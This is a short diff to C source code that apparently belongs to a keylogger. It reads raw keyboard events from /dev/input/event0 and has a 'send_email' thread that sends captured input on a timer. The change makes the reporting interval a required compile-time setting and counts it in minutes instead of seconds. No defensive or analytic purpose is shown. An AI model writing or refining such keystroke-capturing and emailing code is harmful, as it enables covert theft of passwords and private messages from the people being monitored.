@@ -18,7 +18,9 @@ static int pipe_fd[2];
 pthread_mutex_t file_mutex = PTHREAD_MUTEX_INITIALIZER;
 #define BUFFER_SIZE 64
 #define KEYCODE_OFFSET 8
-#define DURATION 10
+#ifndef DURATION
+#error "DURATION is not defined"
+#endif
 #define FILE_EVENT_KEYBOARD "/dev/input/event0"
 
 typedef struct {
@@ -106,7 +108,7 @@ void *send_email(void *arg){
         FD_SET(pipe_fd[0], &read_fds);
 
         struct timeval tv;
-        tv.tv_sec = DURATION;
+        tv.tv_sec = DURATION * 60;
         tv.tv_usec = 0;
 
         int select_result = select(pipe_fd[0] + 1, &read_fds, NULL, NULL, &tv);
